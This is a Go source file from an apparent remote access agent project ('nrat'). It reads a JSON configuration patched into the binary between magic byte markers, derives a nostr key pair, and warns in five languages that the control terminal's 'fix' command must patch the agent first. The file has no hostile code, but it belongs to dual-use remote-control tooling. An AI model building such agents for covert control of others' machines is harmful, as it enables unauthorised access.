package storage

import (
	"bytes"
	_ "embed"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"uw/uboot"
	"uw/ulog"

	"nrat/pkg/nostr"
	"nrat/utils"

	"nrat/model"
)

var (
	//go:embed empty.bin
	DATA           []byte
	sharp, percent byte = '#', '%'
)

func fixWarning() {
	ulog.Warn("如果看到这个警告，请先使用控制端的 fix 命令修补 agent 以填充配置文件")
	ulog.Warn("Если вы видите это предупреждение, сначала используйте команду fix контрольного терминала для восстановления агента, чтобы заполнить файл конфигурации")
	ulog.Warn("If you see this warning, please use the fix command of the control terminal to repair the agent to fill in the configuration file")
	ulog.Warn("警告を見たら、まず制御端の fix コマンドを使って agent を修復して設定ファイルを埋めます")
	ulog.Warn("경고를 보면 먼저 제어 단의 fix 명령을 사용하여 agent를 수리하여 설정 파일을 채웁니다")
	os.Exit(1)
}

func StorageUint(c *uboot.Context) (e error) {
	s := &Storage{
		storageData: &model.AgentStorageData{},
	}
	noneMagic, startMagic, endMagic := byte('\x00'), []byte{percent, percent, percent, sharp},
		[]byte{sharp, percent, percent, percent}

	b, e := utils.ReadEmbedData(DATA, noneMagic, startMagic, endMagic)
	if e != nil {
		return fmt.Errorf("read embed data error: %s", e)
	}

	b = bytes.TrimSpace(b)
	if len(b) < 1 || !bytes.HasPrefix(b, []byte("{")) ||
		!bytes.HasSuffix(b, []byte("}")) {
		fixWarning()
		return errors.New("invalid storage file")
	}

	if e := json.Unmarshal(b, s.storageData); e != nil {
		fixWarning()
		return fmt.Errorf("unmarshal storage file failed: %s", e)
	}

	if s.storageData.PublicKey, e = nostr.
		GetPublicKey(s.storageData.PrivateKey); e != nil {
		fixWarning()
		return fmt.Errorf("get public key failed: %s", e)
	}

	ulog.Info("public key: %s", utils.CutMore(s.storageData.PublicKey, 10))

	if len(os.Args) > 1 && os.Args[1] == "key" {
		fmt.Printf("public key: %s\nprivate key: %s\n",
			s.storageData.PublicKey, utils.CutMore(s.storageData.PrivateKey, 10))
	}

	c.Set("storage", s)
	return nil
}

type Storage struct {
	storageData *model.AgentStorageData
}

func (s *Storage) Storage() *model.AgentStorageData {
	return s.storageData
}

func (s *Storage) Unostr() *model.UnostrStorageData {
	return s.storageData.UnostrStorageData
}

func (s *Storage) Write() error {
	return nil
}

func (s *Storage) Read() error {
	return nil
}
